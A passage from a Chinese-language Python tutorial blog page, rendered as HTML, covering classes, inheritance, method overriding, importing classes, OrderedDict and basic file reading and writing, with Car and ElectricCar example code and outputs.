function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;打印一条指出汽车里程的消息&quot;&quot;&quot;</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it</span></span><br><span class="line"><span class="string">	def update_odometer(self, mileage):</span></span><br><span class="line"><span class="string">		&quot;</span><span class="string">&quot;&quot;</span>将里程表读数设置为指定的值<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		self.odometer_reading = mileage</span></span><br><span class="line"><span class="string">	def increment_odometer(self, miles):</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>将里程表读数增加指定的量<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        self.odometer_reading += miles</span></span><br><span class="line"><span class="string">my_used_car = Car(&#x27;subaru&#x27;, &#x27;outback&#x27;, 2013)</span></span><br><span class="line"><span class="string">print(my_used_car.get_descriptive_name())</span></span><br><span class="line"><span class="string">my_used_car.update_odometer(23500)</span></span><br><span class="line"><span class="string">my_used_car.read_odometer()</span></span><br><span class="line"><span class="string">my_used_car.increment_odometer(100)</span></span><br><span class="line"><span class="string">my_used_car.read_odometer()             </span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">2013 Subaru Outback</span><br><span class="line">This car has 23500 miles on it.</span><br><span class="line">This car has 23600 miles on it.</span><br></pre></td></tr></table></figure></div>

<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><blockquote>
<p>使用super()函数将父类和子类串联起来。</p>
<p>创建子类的实例时，Python首先需要完成的任务是给父类的所有属性赋值。创建子类时，父类必须包含在当前文件中，且位于子类前面。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#electric_car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一次模拟汽车的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">		self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">        long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it.&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">update_odometer</span>(<span class="params">self, mileage</span>):</span><br><span class="line">		<span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">			self.odometer_reading = mileage</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t roll back an odometer!&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">increment_odometer</span>(<span class="params">self, miles</span>):</span><br><span class="line">		self.odometer_reading += miles</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ElectricCar</span>(<span class="title class_ inherited__">Car</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;电动汽车的独特之处&quot;&quot;&quot;</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;初始化父类的属性&quot;&quot;&quot;</span></span><br><span class="line"> 		<span class="built_in">super</span>().__init__(make, model, year)</span><br><span class="line"></span><br><span class="line">my_tesla = ElectricCar(<span class="string">&#x27;tesla&#x27;</span>, <span class="string">&#x27;model s&#x27;</span>, <span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tesla.get_descriptive_name())</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">2016</span> Tesla Model S</span><br></pre></td></tr></table></figure></div>

<h4 id="给子类定义属性和方法"><a href="#给子类定义属性和方法" class="headerlink" title="给子类定义属性和方法"></a>给子类定义属性和方法</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#electric_car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一次模拟汽车的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">		self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">        long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it.&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">update_odometer</span>(<span class="params">self, mileage</span>):</span><br><span class="line">		<span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">			self.odometer_reading = mileage</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t roll back an odometer!&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">increment_odometer</span>(<span class="params">self, miles</span>):</span><br><span class="line">		self.odometer_reading += miles</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ElectricCar</span>(<span class="title class_ inherited__">Car</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Represent aspects of a car,specific to electric vehicles.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,make,model,year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        电动汽车的独特之处</span></span><br><span class="line"><span class="string">        初始化父类的属性，在初始化电动汽车特有的属性</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(make,model,year)</span><br><span class="line">        self.battery_size = <span class="number">70</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">describe_battery</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;打印一条描述电瓶容量的消息&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This car has a &quot;</span> + <span class="built_in">str</span>(self.battery_size) + <span class="string">&quot;-kWh battery.&quot;</span>)</span><br><span class="line">       </span><br><span class="line">my_tesla = ElectricCar(<span class="string">&quot;tesla&quot;</span>,<span class="string">&#x27;model s&#x27;</span>,<span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tesla.get_descriptive_name())</span><br><span class="line">my_tesla.describe_battery()</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">2016 Tesla Model S</span><br><span class="line">This car has a 70-kWh battery.</span><br></pre></td></tr></table></figure></div>

<h4 id="父类函数重载"><a href="#父类函数重载" class="headerlink" title="父类函数重载"></a>父类函数重载</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#electric_car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一次模拟汽车的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):<span class="comment">#构造函数对类进行初始化</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">		self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">        long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it.&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">update_odometer</span>(<span class="params">self, mileage</span>):</span><br><span class="line">		<span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">			self.odometer_reading = mileage</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t roll back an odometer!&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">increment_odometer</span>(<span class="params">self, miles</span>):</span><br><span class="line">		self.odometer_reading += miles</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fill_gas_tank</span>(<span class="params">self,size</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This size of  gas tank of the car is &quot;</span>+ <span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ElectricCar</span>(<span class="title class_ inherited__">Car</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Represent aspects of a car,specific to electric vehicles.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,make,model,year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        电动汽车的独特之处</span></span><br><span class="line"><span class="string">        初始化父类的属性，在初始化电动汽车特有的属性</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(make,model,year)</span><br><span class="line">        self.battery_size = <span class="number">70</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">describe_battery</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;打印一条描述电瓶容量的消息&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This car has a &quot;</span> + <span class="built_in">str</span>(self.battery_size) + <span class="string">&quot;-kWh battery.&quot;</span>)</span><br><span class="line">	<span class="comment">#对父类的fill_gas_tank()方法进行重载</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fill_gas_tank</span>():</span><br><span class="line">		<span class="string">&quot;&quot;&quot;电动车没有油箱&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This car doesn&#x27;t need a tank!&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h4 id="将实例用作属性"><a href="#将实例用作属性" class="headerlink" title="将实例用作属性"></a>将实例用作属性</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#electric_car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一次模拟汽车的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):<span class="comment">#构造函数对类进行初始化</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">		self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">        long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it.&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">update_odometer</span>(<span class="params">self, mileage</span>):</span><br><span class="line">		<span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">			self.odometer_reading = mileage</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t roll back an odometer!&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">increment_odometer</span>(<span class="params">self, miles</span>):</span><br><span class="line">		self.odometer_reading += miles</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fill_gas_tank</span>(<span class="params">self,size</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This size of  gas tank of the car is &quot;</span>+ <span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Battery</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一次模拟电动汽车电瓶的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, battery_size=<span class="number">70</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化电瓶的属性&quot;&quot;&quot;</span></span><br><span class="line">		self.battery_size = battery_size</span><br><span class="line"> 	<span class="keyword">def</span> <span class="title function_">describe_battery</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;打印一条描述电瓶容量的消息&quot;&quot;&quot;</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has a &quot;</span> + <span class="built_in">str</span>(self.battery_size) + <span class="string">&quot;-kWh battery.&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_range</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;打印一条消息，指出电瓶的续航里程&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.battery_size == <span class="number">70</span>:</span><br><span class="line">        <span class="built_in">range</span> = <span class="number">240</span></span><br><span class="line">        <span class="keyword">elif</span> self.battery_size == <span class="number">85</span>:</span><br><span class="line">        <span class="built_in">range</span> = <span class="number">270</span></span><br><span class="line">        message = <span class="string">&quot;This car can go approximately &quot;</span> + <span class="built_in">str</span>(<span class="built_in">range</span>)</span><br><span class="line">        message += <span class="string">&quot; miles on a full charge.&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ElectricCar</span>(<span class="title class_ inherited__">Car</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;电动汽车的独特之处&quot;&quot;&quot;</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;初始化父类的属性，再初始化电动汽车特有的属性&quot;&quot;&quot;</span></span><br><span class="line">		<span class="built_in">super</span>().__init__(make, model, year)</span><br><span class="line">		self.battery = Battery()</span><br><span class="line">        </span><br><span class="line">my_tesla = ElectricCar(<span class="string">&#x27;tesla&#x27;</span>, <span class="string">&#x27;model s&#x27;</span>, <span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tesla.get_descriptive_name())</span><br><span class="line">my_tesla.battery.describe_battery() </span><br><span class="line">my_tesla.battery.get_range()</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">2016 Tesla Model S</span><br><span class="line">This car has a 70-kWh battery.</span><br><span class="line">This car can go approximately 240 miles on a full charge.</span><br></pre></td></tr></table></figure></div>

<h3 id="导入类"><a href="#导入类" class="headerlink" title="导入类"></a>导入类</h3><h4 id="导入单个类"><a href="#导入单个类" class="headerlink" title="导入单个类"></a>导入单个类</h4><blockquote>
<p>from 文件名 import 类名</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#car.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;一个可用于表示汽车的类&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一次模拟汽车的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化描述汽车的属性&quot;&quot;&quot;</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;返回整洁的描述性名称&quot;&quot;&quot;</span></span><br><span class="line">        long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;打印一条消息，指出汽车的里程&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it.&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update_odometer</span>(<span class="params">self, mileage</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        将里程表读数设置为指定的值</span></span><br><span class="line"><span class="string">        拒绝将里程表往回拨</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">        	self.odometer_reading = mileage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        	<span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t roll back an odometer!&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">increment_odometer</span>(<span class="params">self, miles</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;将里程表读数增加指定的量&quot;&quot;&quot;</span></span><br><span class="line">        self.odometer_reading += miles</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#my_car.py</span></span><br><span class="line"><span class="keyword">from</span> car <span class="keyword">import</span> Car</span><br><span class="line">my_new_car = Car(<span class="string">&#x27;audi&#x27;</span>, <span class="string">&#x27;a4&#x27;</span>, <span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_new_car.get_descriptive_name())</span><br><span class="line">my_new_car.odometer_reading = <span class="number">23</span></span><br><span class="line">my_new_car.read_odometer()</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">2016 Audi A4</span><br><span class="line">This car has 23 miles on it.</span><br></pre></td></tr></table></figure></div>

<h4 id="从一个模块中导入多个类"><a href="#从一个模块中导入多个类" class="headerlink" title="从一个模块中导入多个类"></a>从一个模块中导入多个类</h4><blockquote>
<p>from 模块名  import   类名,类名</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#my_cars.py</span></span><br><span class="line"><span class="keyword">from</span> electric_car <span class="keyword">import</span> Car,ElectricCar</span><br><span class="line"></span><br><span class="line">my_beetle = Car(<span class="string">&#x27;volkswagen&#x27;</span>, <span class="string">&#x27;beetle&#x27;</span>, <span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_beetle.get_descriptive_name())</span><br><span class="line"></span><br><span class="line">my_tesla = ElectricCar(<span class="string">&#x27;tesla&#x27;</span>, <span class="string">&#x27;roadster&#x27;</span>, <span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tesla.get_descriptive_name())</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">2016 Volkswagen Beetle</span><br><span class="line">2016 Tesla Roadster</span><br></pre></td></tr></table></figure></div>

<h4 id="导入模块以及模块中的所有类"><a href="#导入模块以及模块中的所有类" class="headerlink" title="导入模块以及模块中的所有类"></a>导入模块以及模块中的所有类</h4><blockquote>
<p><strong>导入整个模块：</strong></p>
<p>import 模块名</p>
<p><strong>导入模块中的所有类：</strong></p>
<p>from module_name import *</p>
</blockquote>
<h3 id="Python标准库"><a href="#Python标准库" class="headerlink" title="Python标准库"></a>Python标准库</h3><blockquote>
<p>推荐几个查看Python标准库的网址：</p>
<p><a class="link" href="https://docs.python.org/zh-cn/3/library/index.html">Python官网的标注库 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link" href="https://www.runoob.com/python3/python3-stdlib.html">菜鸟教程的标注库 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>一、<strong>collestions</strong>库中的OrderedDict方法</p>
<blockquote>
<p>OrderedDict()创建一个有序字典，它记录了键值对添加的顺序</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collestions <span class="keyword">import</span> OrderedDict</span><br><span class="line"><span class="comment">#将字典的键和值的顺序进行记录</span></span><br><span class="line">favorite_languages = OrderedDict()</span><br><span class="line"><span class="comment">#调用OrderedDict()函数创建favorite_languages空字典</span></span><br><span class="line">favorite_languages[<span class="string">&#x27;jen&#x27;</span>] = <span class="string">&#x27;python&#x27;</span></span><br><span class="line">favorite_languages[<span class="string">&#x27;sarah&#x27;</span>] = <span class="string">&#x27;c&#x27;</span></span><br><span class="line">favorite_languages[<span class="string">&#x27;edward&#x27;</span>] = <span class="string">&#x27;ruby&#x27;</span></span><br><span class="line">favorite_languages[<span class="string">&#x27;phil&#x27;</span>] = <span class="string">&#x27;python&#x27;</span></span><br><span class="line"><span class="keyword">for</span> name, language <span class="keyword">in</span> favorite_languages.items():</span><br><span class="line">    <span class="built_in">print</span>(name.title() + <span class="string">&quot;&#x27;s favorite language is &quot;</span> +language.title() + <span class="string">&quot;.&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Jen<span class="string">&#x27;s favorite language is Python.</span></span><br><span class="line"><span class="string">Sarah&#x27;</span>s favorite language is C.</span><br><span class="line">Edward<span class="string">&#x27;s favorite language is Ruby.</span></span><br><span class="line"><span class="string">Phil&#x27;</span>s favorite language is Python.</span><br></pre></td></tr></table></figure></div>

<p>二、random库中的randint()方法</p>
<blockquote>
<p>randint()返回一个位于指定范围内的整数</p>
</blockquote>
<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><h3 id="从文件中读取数据"><a href="#从文件中读取数据" class="headerlink" title="从文件中读取数据"></a>从文件中读取数据</h3><blockquote>
<p>**open( ‘files_name’)**打开文件并且返回一个文件对象，注意，该文件和当前执行的文件所在目录相同，如若不同则应该写入文件路径：</p>
<p><strong>Linux 和OS X系统中的文件路径用’&#x2F;‘斜杆</strong></p>
<p>with open(‘text_files&#x2F;filename.txt’) as file_object:</p>
<p><strong>Windows系统中文件路径用’\‘反斜杠</strong></p>
<p>with open(‘text_files\filename.txt’) as file_object:</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;files_name.txt&#x27;</span>) <span class="keyword">as</span> file_objecta:<span class="comment">#files_name需要带上文件后缀</span></span><br><span class="line">	<span class="string">&quot;&quot;&quot;关键字with，让Python负责妥善地打开和关闭文件。&quot;&quot;&quot;</span></span><br><span class="line">	contents = file_object.read()</span><br><span class="line">    <span class="string">&quot;&quot;&quot;file_object.read()调用读取函数读取文件中的内容&quot;&quot;&quot;</span></span><br><span class="line">	<span class="built_in">print</span>(contents.rstrip())<span class="comment">#rstrip会删除字符串末尾的字符</span></span><br></pre></td></tr></table></figure></div>

<h4 id="逐行读取"><a href="#逐行读取" class="headerlink" title="逐行读取"></a>逐行读取</h4><blockquote>
<p>**for line in file_object:**利用循环进行逐行读取文件内容</p>
</blockquote>
<blockquote>
<p><strong>pi_digits.txt</strong></p>
<p>3.1415926535<br>    8979323846<br>    2643383279</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">filename = <span class="string">&#x27;pi_digits.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> file_object:</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> file_object:</span><br><span class="line">	<span class="built_in">print</span>(line.rstrip())</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">3.1415926535</span><br><span class="line">  8979323846</span><br><span class="line">  2643383279</span><br></pre></td></tr></table></figure></div>

<h4 id="创建一个包含文件各行内容的列表"><a href="#创建一个包含文件各行内容的列表" class="headerlink" title="创建一个包含文件各行内容的列表"></a>创建一个包含文件各行内容的列表</h4><blockquote>
<p>lines &#x3D; file_object.readlines()<br>#调用readlines()函数将文件的各行存储在创建的列表中</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">filename = <span class="string">&#x27;pi_digits.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> file_object:</span><br><span class="line">	lines = file_object.readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="built_in">print</span>(line.rstrip())</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">3.1415926535</span><br><span class="line">  8979323846</span><br><span class="line">  2643383279</span><br></pre></td></tr></table></figure></div>

<h4 id="使用文件里的内容"><a href="#使用文件里的内容" class="headerlink" title="使用文件里的内容"></a>使用文件里的内容</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pi_string.py</span></span><br><span class="line">filename = <span class="string">&#x27;pi_digits.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> file_object:</span><br><span class="line">    lines = file_object.readlines()</span><br><span class="line">pi_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">	pi_string += line.strip()</span><br><span class="line"><span class="built_in">print</span>(pi_string)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pi_string))</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">3.141592653589793238462643383279</span><br><span class="line">32</span><br></pre></td></tr></table></figure></div>

<h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><blockquote>
<p> <u><strong>with open(filename,’a’) as file_object:</strong></u>#以附加模式打开文件</p>
<p><strong><u><em>模式：</em></u></strong></p>
<p>​	<strong>#读取模式‘r’</strong></p>
<p>​	<strong>#写入模式’w,’打开前清空文件内容</strong></p>
<p>​	<strong>#附加模式’a’</strong></p>
<p>​	<strong>#读取和写入模式’r+’</strong></p>
<p><strong><u>file_object.write(“需要写入的内容”)</u></strong></p>
<p>注意：</p>
<p><strong>Python只能将字符串写入文本文件。要将数值数据存储到文本文件中，必须先使用函数str()将其转换为字符串格式。</strong></p>
</blockquote>
